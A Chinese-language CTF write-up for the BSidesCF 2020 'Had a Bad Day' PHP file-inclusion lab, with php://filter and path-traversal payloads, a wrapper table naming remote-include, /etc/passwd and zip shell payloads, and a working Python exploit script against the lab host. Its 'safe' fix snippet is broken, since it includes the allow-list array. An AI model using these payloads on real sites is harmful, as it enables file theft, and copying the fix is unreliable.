# Writeup 4 [BSidesCF 2020] Had a Bad Day



## 一、题目信息

- **题目名称**：[BSidesCF 2020] Had a Bad Day
- **题目类型**：Web - 文件包含漏洞（LFI）
- **难度**：简单
- **考点**：PHP文件包含、伪协议利用、路径穿越、关键字绕过

---

## 二、解题过程

### 2.1 初始探测

访问靶机地址，页面显示两个按钮：

<img width="1490" height="560" alt="01" src="https://github.com/user-attachments/assets/12aba0a7-3986-4c37-8c59-3a6d576a6e3e" />

- **WOOFERS**（狗狗图片）
- **MEOWERS**（猫咪图片）

点击按钮后，URL中出现`category`参数：

```
http://xxx/index.php?category=woofers
http://xxx/index.php?category=meowers
```

### 2.2 发现文件包含漏洞

尝试修改`category`参数为其他值：

```
?category=test
```

页面返回：

```
Sorry, we currently only support woofers and meowers.
```

这说明后端存在参数过滤，可能包含文件。

### 2.3 尝试读取源码

尝试使用PHP伪协议读取`index.php`：

```
?category=php://filter/convert.base64-encode/resource=index.php
```

报错信息显示：

```
Warning: include(php://filter/convert.base64-encode/resource=index.php.php): failed to open stream: operation failed in /var/www/html/index.php on line 37

Warning: include(): Failed opening 'php://filter/convert.base64-encode/resource=index.php.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 37
```

**关键发现**：后端自动添加了`.php`后缀！

去掉`.php`重试：

```http
?category=php://filter/convert.base64-encode/resource=index
```

页面显示：

```
Had a bad day?
Cheer up!

Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up!
PGh0bWw+CiAgPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJYLVVBLUNvbXBhdGlibGUiIGNvbnRlbnQ9IklFPWVkZ2UiPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IkltYWdlcyB0aGF0IHNwYXJrIGpveSI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCwgbWluaW11bS1zY2FsZT0xLjAiPgogICAgPHRpdGxlPkhhZCBhIGJhZCBkYXk/PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iY3NzL21hdGVyaWFsLm1pbi5jc3MiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJjc3Mvc3R5bGUuY3NzIj4KICA8L2hlYWQ+CiAgPGJvZHk+CiAgICA8ZGl2IGNsYXNzPSJwYWdlLWxheW91dCBtZGwtbGF5b3V0IG1kbC1sYXlvdXQtLWZpeGVkLWhlYWRlciBtZGwtanMtbGF5b3V0IG1kbC1jb2xvci0tZ3JleS0xMDAiPgogICAgICA8aGVhZGVyIGNsYXNzPSJwYWdlLWhlYWRlciBtZGwtbGF5b3V0X19oZWFkZXIgbWRsLWxheW91dF9faGVhZGVyLS1zY3JvbGwgbWRsLWNvbG9yLS1ncmV5LTEwMCBtZGwtY29sb3ItdGV4dC0tZ3JleS04MDAiPgogICAgICAgIDxkaXYgY2xhc3M9Im1kbC1sYXlvdXRfX2hlYWRlci1yb3ciPgogICAgICAgICAgPHNwYW4gY2xhc3M9Im1kbC1sYXlvdXQtdGl0bGUiPkhhZCBhIGJhZCBkYXk/PC9zcGFuPgogICAgICAgICAgPGRpdiBjbGFzcz0ibWRsLWxheW91dC1zcGFjZXIiPjwvZGl2PgogICAgICAgIDxkaXY+CiAgICAgIDwvaGVhZGVyPgogICAgICA8ZGl2IGNsYXNzPSJwYWdlLXJpYmJvbiI+PC9kaXY+CiAgICAgIDxtYWluIGNsYXNzPSJwYWdlLW1haW4gbWRsLWxheW91dF9fY29udGVudCI+CiAgICAgICAgPGRpdiBjbGFzcz0icGFnZS1jb250YWluZXIgbWRsLWdyaWQiPgogICAgICAgICAgPGRpdiBjbGFzcz0ibWRsLWNlbGwgbWRsLWNlbGwtLTItY29sIG1kbC1jZWxsLS1oaWRlLXRhYmxldCBtZGwtY2VsbC0taGlkZS1waG9uZSI+PC9kaXY+CiAgICAgICAgICA8ZGl2IGNsYXNzPSJwYWdlLWNvbnRlbnQgbWRsLWNvbG9yLS13aGl0ZSBtZGwtc2hhZG93LS00ZHAgY29udGVudCBtZGwtY29sb3ItdGV4dC0tZ3JleS04MDAgbWRsLWNlbGwgbWRsLWNlbGwtLTgtY29sIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0icGFnZS1jcnVtYnMgbWRsLWNvbG9yLXRleHQtLWdyZXktNTAwIj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxoMz5DaGVlciB1cCE8L2gzPgogICAgICAgICAgICAgIDxwPgogICAgICAgICAgICAgICAgRGlkIHlvdSBoYXZlIGEgYmFkIGRheT8gRGlkIHRoaW5ncyBub3QgZ28geW91ciB3YXkgdG9kYXk/IEFyZSB5b3UgZmVlbGluZyBkb3duPyBQaWNrIGFuIG9wdGlvbiBhbmQgbGV0IHRoZSBhZG9yYWJsZSBpbWFnZXMgY2hlZXIgeW91IHVwIQogICAgICAgICAgICAgIDwvcD4KICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJwYWdlLWluY2x1ZGUiPgogICAgICAgICAgICAgIDw/cGhwCgkJCQkkZmlsZSA9ICRfR0VUWydjYXRlZ29yeSddOwoKCQkJCWlmKGlzc2V0KCRmaWxlKSkKCQkJCXsKCQkJCQlpZiggc3RycG9zKCAkZmlsZSwgIndvb2ZlcnMiICkgIT09ICBmYWxzZSB8fCBzdHJwb3MoICRmaWxlLCAibWVvd2VycyIgKSAhPT0gIGZhbHNlIHx8IHN0cnBvcyggJGZpbGUsICJpbmRleCIpKXsKCQkJCQkJaW5jbHVkZSAoJGZpbGUgLiAnLnBocCcpOwoJCQkJCX0KCQkJCQllbHNlewoJCQkJCQllY2hvICJTb3JyeSwgd2UgY3VycmVudGx5IG9ubHkgc3VwcG9ydCB3b29mZXJzIGFuZCBtZW93ZXJzLiI7CgkJCQkJfQoJCQkJfQoJCQkJPz4KCQkJPC9kaXY+CiAgICAgICAgICA8Zm9ybSBhY3Rpb249ImluZGV4LnBocCIgbWV0aG9kPSJnZXQiIGlkPSJjaG9pY2UiPgogICAgICAgICAgICAgIDxjZW50ZXI+PGJ1dHRvbiBvbmNsaWNrPSJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY2hvaWNlJykuc3VibWl0KCk7IiBuYW1lPSJjYXRlZ29yeSIgdmFsdWU9Indvb2ZlcnMiIGNsYXNzPSJtZGwtYnV0dG9uIG1kbC1idXR0b24tLWNvbG9yZWQgbWRsLWJ1dHRvbi0tcmFpc2VkIG1kbC1qcy1idXR0b24gbWRsLWpzLXJpcHBsZS1lZmZlY3QiIGRhdGEtdXBncmFkZWQ9IixNYXRlcmlhbEJ1dHRvbixNYXRlcmlhbFJpcHBsZSI+V29vZmVyczxzcGFuIGNsYXNzPSJtZGwtYnV0dG9uX19yaXBwbGUtY29udGFpbmVyIj48c3BhbiBjbGFzcz0ibWRsLXJpcHBsZSBpcy1hbmltYXRpbmciIHN0eWxlPSJ3aWR0aDogMTg5LjM1NnB4OyBoZWlnaHQ6IDE4OS4zNTZweDsgdHJhbnNmb3JtOiB0cmFuc2xhdGUoLTUwJSwgLTUwJSkgdHJhbnNsYXRlKDMxcHgsIDI1cHgpOyI+PC9zcGFuPjwvc3Bhbj48L2J1dHRvbj4KICAgICAgICAgICAgICA8YnV0dG9uIG9uY2xpY2s9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjaG9pY2UnKS5zdWJtaXQoKTsiIG5hbWU9ImNhdGVnb3J5IiB2YWx1ZT0ibWVvd2VycyIgY2xhc3M9Im1kbC1idXR0b24gbWRsLWJ1dHRvbi0tY29sb3JlZCBtZGwtYnV0dG9uLS1yYWlzZWQgbWRsLWpzLWJ1dHRvbiBtZGwtanMtcmlwcGxlLWVmZmVjdCIgZGF0YS11cGdyYWRlZD0iLE1hdGVyaWFsQnV0dG9uLE1hdGVyaWFsUmlwcGxlIj5NZW93ZXJzPHNwYW4gY2xhc3M9Im1kbC1idXR0b25fX3JpcHBsZS1jb250YWluZXIiPjxzcGFuIGNsYXNzPSJtZGwtcmlwcGxlIGlzLWFuaW1hdGluZyIgc3R5bGU9IndpZHRoOiAxODkuMzU2cHg7IGhlaWdodDogMTg5LjM1NnB4OyB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgtNTAlLCAtNTAlKSB0cmFuc2xhdGUoMzFweCwgMjVweCk7Ij48L3NwYW4+PC9zcGFuPjwvYnV0dG9uPjwvY2VudGVyPgogICAgICAgICAgPC9mb3JtPgoKICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICA8L21haW4+CiAgICA8L2Rpdj4KICAgIDxzY3JpcHQgc3JjPSJqcy9tYXRlcmlhbC5taW4uanMiPjwvc2NyaXB0PgogIDwvYm9keT4KPC9odG1sPg==
```

Base64解码，得到index.php的源码：

```html
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="Images that spark joy">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
    <title>Had a bad day?</title>
    <link rel="stylesheet" href="css/material.min.css">
    <link rel="stylesheet" href="css/style.css">
  </head>
  <body>
    <div class="page-layout mdl-layout mdl-layout--fixed-header mdl-js-layout mdl-color--grey-100">
      <header class="page-header mdl-layout__header mdl-layout__header--scroll mdl-color--grey-100 mdl-color-text--grey-800">
        <div class="mdl-layout__header-row">
          <span class="mdl-layout-title">Had a bad day?</span>
          <div class="mdl-layout-spacer"></div>
        <div>
      </header>
      <div class="page-ribbon"></div>
      <main class="page-main mdl-layout__content">
        <div class="page-container mdl-grid">
          <div class="mdl-cell mdl-cell--2-col mdl-cell--hide-tablet mdl-cell--hide-phone"></div>
          <div class="page-content mdl-color--white mdl-shadow--4dp content mdl-color-text--grey-800 mdl-cell mdl-cell--8-col">
            <div class="page-crumbs mdl-color-text--grey-500">
            </div>
            <h3>Cheer up!</h3>
              <p>
                Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up!
              </p>
              <div class="page-include">
              <?php
				$file = $_GET['category'];

				if(isset($file))
				{
					if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
						include ($file . '.php');
					}
					else{
						echo "Sorry, we currently only support woofers and meowers.";
					}
				}
				?>
			</div>
          <form action="index.php" method="get" id="choice">
              <center><button onclick="document.getElementById('choice').submit();" name="category" value="woofers" class="mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect" data-upgraded=",MaterialButton,MaterialRipple">Woofers<span class="mdl-button__ripple-container"><span class="mdl-ripple is-animating" style="width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);"></span></span></button>
              <button onclick="document.getElementById('choice').submit();" name="category" value="meowers" class="mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect" data-upgraded=",MaterialButton,MaterialRipple">Meowers<span class="mdl-button__ripple-container"><span class="mdl-ripple is-animating" style="width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);"></span></span></button></center>
          </form>

          </div>
        </div>
      </main>
    </div>
    <script src="js/material.min.js"></script>
  </body>
</html>
```

### 2.4 源码分析

解码后的核心代码：

```php
              <?php
				$file = $_GET['category'];

				if(isset($file))
				{
					if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
						include ($file . '.php');
					}
					else{
						echo "Sorry, we currently only support woofers and meowers.";
					}
				}
				?>
```

**代码逻辑分析**：

1. 获取`category`参数
2. 检查参数是否包含`woofers`、`meowers`或`index`
3. 通过检查后，包含`参数值.php`文件

### 2.5 构造绕过Payload

目标：读取根目录下的`flag`文件

**绕过思路**：

1. 参数必须包含`index`来通过`strpos()`检查
2. 使用`../`进行路径穿越
3. 利用PHP伪协议避免自动添加`.php`

**成功Payload**：

```
?category=php://filter/convert.base64-encode/resource=index/../flag
```

页面显示：

```
Had a bad day?
Cheer up!

Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up!
PCEtLSBDYW4geW91IHJlYWQgdGhpcyBmbGFnPyAtLT4KPD9waHAKIC8vIGZsYWd7YjY2MDE1MGEtMmU5ZS00MzgxLTgxZGEtNmVjYjM4OGVhMWM4fQo/Pgo=
```

**解码后，得到Flag**：

```php
<!-- Can you read this flag? -->
<?php
 // flag{b660150a-2e9e-4381-81da-6ecb388ea1c8}
?>
```

---

## 三、PHP伪协议详解

### 3.1 什么是PHP伪协议

PHP伪协议是一种特殊的流封装器，允许通过PHP原生支持的协议访问各种资源，包括文件、数据流、压缩包等。

### 3.2 常用伪协议

| 协议           | 说明                       | 示例                                                    |
| -------------- | -------------------------- | ------------------------------------------------------- |
| `php://filter` | 读取文件源码（Base64编码） | `php://filter/convert.base64-encode/resource=index.php` |
| `php://input`  | 读取POST原始数据           | `php://input`（配合`<?php phpinfo();?>`）               |
| `php://memory` | 读写内存数据               | `php://memory`                                          |
| `php://temp`   | 读写临时文件               | `php://temp`                                            |
| `data://`      | 数据流封装                 | `data://text/plain,<?php phpinfo();?>`                  |
| `file://`      | 访问本地文件系统           | `file:///etc/passwd`                                    |
| `http://`      | HTTP访问                   | `http://example.com/shell.txt`                          |
| `zip://`       | 读取压缩包                 | `zip://shell.zip#shell.php`                             |

### 3.3 php://filter 详细说明

**语法**：

```
php://filter/[操作]/resource=文件路径
```

**常用操作**：

| 操作                    | 说明           | 示例                                                    |
| ----------------------- | -------------- | ------------------------------------------------------- |
| `convert.base64-encode` | Base64编码输出 | `php://filter/convert.base64-encode/resource=index.php` |
| `convert.base64-decode` | Base64解码     | `php://filter/convert.base64-decode/resource=data.txt`  |
| `string.rot13`          | ROT13编码      | `php://filter/string.rot13/resource=index.php`          |
| `string.toupper`        | 转大写         | `php://filter/string.toupper/resource=index.php`        |
| `string.tolower`        | 转小写         | `php://filter/string.tolower/resource=index.php`        |
| `zlib.deflate`          | 压缩           | `php://filter/zlib.deflate/resource=index.php`          |
| `zlib.inflate`          | 解压           | `php://filter/zlib.inflate/resource=index.php`          |

**链式操作**：

```php
// 多个操作可以链式使用
php://filter/convert.base64-decode|string.toupper/resource=index.php
```

### 3.4 本题中的应用

```http
?category=php://filter/convert.base64-encode/resource=index/../flag
```

执行流程：

1. `php://filter` - 调用过滤器
2. `convert.base64-encode` - 将读取内容进行Base64编码
3. `resource=index/../flag` - 指定读取的文件路径

---

## 四、核心函数详解

### 4.1 strpos() 函数

**函数原型**：

```php
strpos(string $haystack, string $needle, int $offset = 0): int|false
```

**参数说明**：

- `$haystack`：被搜索的字符串
- `$needle`：要搜索的子字符串
- `$offset`：可选，开始搜索的位置

**返回值**：

- 成功：返回首次出现的位置（从0开始计数）
- 失败：返回`false`

**示例**：

```php
$str = "hello world";

echo strpos($str, "world");  // 输出: 6
echo strpos($str, "hello");  // 输出: 0
echo strpos($str, "xyz");    // 输出: false
echo strpos($str, "o");      // 输出: 4（第一个o的位置）

// 注意：0和false的区别
if (strpos($str, "hello") !== false) {
    echo "找到！";  // 使用!==判断
}
```

**本题中的应用**：

```php
if( strpos( $file, "index" ) !== false )
```

只要参数中包含"index"字符串（无论位置），就通过检查。

### 4.2 include() 函数

**函数原型**：

```php
include(string $filename): mixed
```

**说明**：

- 包含并执行指定文件
- 如果文件不存在，产生警告（Warning），脚本继续执行
- 与`require()`不同，`require()`会产生致命错误（Fatal Error）

**示例**：

```php
include 'config.php';      // 包含同目录下的config.php
include './lib/functions.php';  // 包含子目录文件
include '../header.php';    // 包含上级目录文件
include $file . '.php';     // 动态包含（本题用法）
```

**包含路径顺序**：

1. 当前工作目录
2. `php.ini`中配置的`include_path`
3. 文件所在目录

**本题中的应用**：

```php
include ($file . '.php');
```

后端自动添加`.php`后缀，所以要读取纯文本文件（这里的“纯文本文件”指的是只有文件名、没有后缀的文件，不是指txt文件）需要绕过。

### 4.3 isset() 函数

**函数原型**：

```php
isset(mixed $var, mixed ...$vars): bool
```

**说明**：

- 检测变量是否已设置且不为`NULL`
- 可以同时检测多个变量

**示例**：

```php
$var1 = "hello";
$var2 = null;
$var3;

echo isset($var1);  // 输出: 1 (true)
echo isset($var2);  // 输出: (false)
echo isset($var3);  // 输出: (false)
echo isset($var1, $var2);  // 输出: (false，因为var2未设置)
```

---

## 五、路径穿越详解

### 5.1 什么是路径穿越

路径穿越（Path Traversal），也称为目录遍历（Directory Traversal），是一种通过`../`（上级目录）或`..\`（Windows上级目录）等特殊字符，突破应用程序限制，访问任意文件的漏洞。

### 5.2 路径穿越符号

| 符号  | 说明               | 示例                    |
| ----- | ------------------ | ----------------------- |
| `../` | Linux/Unix上级目录 | `../../etc/passwd`      |
| `..\` | Windows上级目录    | `..\..\windows\win.ini` |
| `./`  | 当前目录           | `./config.php`          |
| `/`   | 根目录             | `/etc/passwd`           |

### 5.3 路径穿越原理

假设文件结构：

```
/var/www/html/
├── index.php
├── flag
├── woofers.php
└── img/
    └── dog/
        └── 1.jpg
```

**正常访问**：

```php
include('woofers.php');  // 实际路径: /var/www/html/woofers.php
```

**路径穿越**：

```php
include('../flag');  // 实际路径: /var/www/flag（跳出html目录）
include('../../flag');  // 实际路径: /var/flag
include('../../../flag');  // 实际路径: /flag
```

### 5.4 本题中的路径穿越

原始代码：

```php
include ($file . '.php');
```

我们的Payload：

```
index/../flag
```

实际包含的文件路径分析：

1. `index/` - 通过strpos检查
2. `../` - 返回上级目录
3. `flag` - 最终读取的文件

执行流程：

```
包含目标: index/../flag.php
实际解析: index/../flag → 跳出index目录 → 回到当前目录 → 读取flag文件
但因为用了伪协议，不会添加.php，所以读取的是纯文本flag文件
```

### 5.5 多层路径穿越示例

```php
// 假设当前在 /var/www/html/subdir/page.php

include('../config.php');     // 读取 /var/www/html/config.php
include('../../config.php');  // 读取 /var/www/config.php
include('../../../config.php'); // 读取 /var/config.php
include('../../../../config.php'); // 读取 /config.php
```

### 5.6 防御方法

```php
// 不安全的写法
include($_GET['page'] . '.php');

// 安全的写法
$allowed_pages = ['home', 'about', 'contact'];
if (in_array($_GET['page'], $allowed_pages)) {
    include($allowed_pages . '.php');
}

// 或使用realpath()验证
$base_dir = '/var/www/html/';
$file = realpath($base_dir . $_GET['page']);
if (strpos($file, $base_dir) === 0) {
    include($file);
}
```

---

## 六、最终Flag

```
flag{b660150a-2e9e-4381-81da-6ecb388ea1c8}
```

---

## 七、知识点总结

| 知识点       | 说明                       |
| ------------ | -------------------------- |
| 文件包含漏洞 | 后端动态包含文件，参数可控 |
| PHP伪协议    | `php://filter`读取源码     |
| strpos绕过   | 利用子字符串匹配特性       |
| 路径穿越     | 使用`../`跳出目录限制      |
| 后缀绕过     | 利用伪协议避免自动添加后缀 |

---

## 八、扩展思考

1. **如果flag文件是PHP文件怎么办？**
   - 可以直接包含，但会执行代码而不是显示源码
   - 需要用`php://filter`读取

2. **如果禁用了`php://filter`怎么办？**
   - 尝试`php://input`配合POST数据
   - 尝试日志注入（包含access.log）
   - 尝试`zip://`或`phar://`协议

3. **如果strpos严格匹配单词怎么办？**
   - 可能需要使用其他绕过技巧
   - 或者利用`%00`截断（PHP<5.3.4）

---

## 九、完整的攻击脚本（Python)

```python
import requests
import base64
import re

# 靶场地址
url = "http://78dda4b3-bbe9-46ec-997e-27f1fed16251.node5.buuoj.cn:81/index.php"

# 构造payload（核心：绕过过滤并读取flag文件）
payload = "php://filter/convert.base64-encode/resource=index/../flag"

print("[*] 开始利用文件包含漏洞获取flag")
print("=" * 60)

# 发送请求
try:
    r = requests.get(url, params={"category": payload}, timeout=10)
    print(f"[+] 请求成功，状态码: {r.status_code}")
    print(f"[+] 响应长度: {len(r.text)} 字节")

    # 方法1：尝试从响应中提取base64编码的内容
    # 响应可能是纯base64，也可能包含在HTML中
    response_text = r.text

    # 查找长的base64字符串（通常flag文件的base64编码较长）
    base64_pattern = r'[A-Za-z0-9+/=]{100,}'
    matches = re.findall(base64_pattern, response_text)

    if matches:
        # 取最长的base64字符串
        b64_string = max(matches, key=len)
        print(f"\n[+] 提取到Base64编码（长度: {len(b64_string)}）")

        # 解码
        try:
            decoded = base64.b64decode(b64_string).decode('utf-8', errors='ignore')
            print("\n[+] 解码成功！内容如下：")
            print("=" * 60)
            print(decoded)
            print("=" * 60)

            # 提取flag
            flag_pattern = r'flag\{[^}]+\}'
            flags = re.findall(flag_pattern, decoded)
            if flags:
                print(f"\n🎉 成功获取FLAG: {flags[0]}")
            else:
                print("\n[!] 解码内容中未找到flag，请检查上面的完整输出")

        except Exception as e:
            print(f"[-] 解码失败: {e}")
            print(f"原始Base64（前200字符）: {b64_string[:200]}")
    else:
        print("[-] 未找到Base64编码内容")
        print("响应内容预览:")
        print(response_text[:500])

except Exception as e:
    print(f"[-] 请求失败: {e}")

# 如果上面的方法不行，尝试另一种payload格式
print("\n" + "=" * 60)
print("[*] 尝试第二种payload格式")
payload2 = "php://filter/convert.base64-encode/index/resource=flag"

try:
    r2 = requests.get(url, params={"category": payload2}, timeout=10)
    print(f"[+] 响应长度: {len(r2.text)} 字节")

    # 同样的解码流程
    matches2 = re.findall(r'[A-Za-z0-9+/=]{100,}', r2.text)
    if matches2:
        b64_string2 = max(matches2, key=len)
        try:
            decoded2 = base64.b64decode(b64_string2).decode('utf-8', errors='ignore')
            print("\n[+] 解码成功！")
            print(decoded2)

            flags2 = re.findall(r'flag\{[^}]+\}', decoded2)
            if flags2:
                print(f"\n🎉 成功获取FLAG: {flags2[0]}")
        except:
            pass
except:
    pass
```

运行结果：

```python
[*] 开始利用文件包含漏洞获取flag
============================================================
[+] 请求成功，状态码: 200
[+] 响应长度: 2816 字节

[+] 提取到Base64编码（长度: 120）

[+] 解码成功！内容如下：
============================================================
<!-- Can you read this flag? -->
<?php
 // flag{b660150a-2e9e-4381-81da-6ecb388ea1c8}
?>

============================================================

🎉 成功获取FLAG: flag{b660150a-2e9e-4381-81da-6ecb388ea1c8}

============================================================
[*] 尝试第二种payload格式
[+] 响应长度: 3076 字节

[+] 解码成功！
<!-- Can you read this flag? -->
<?php
 // flag{b660150a-2e9e-4381-81da-6ecb388ea1c8}
?>


🎉 成功获取FLAG: flag{b660150a-2e9e-4381-81da-6ecb388ea1c8}

进程已结束，退出代码为 0
```

🎉
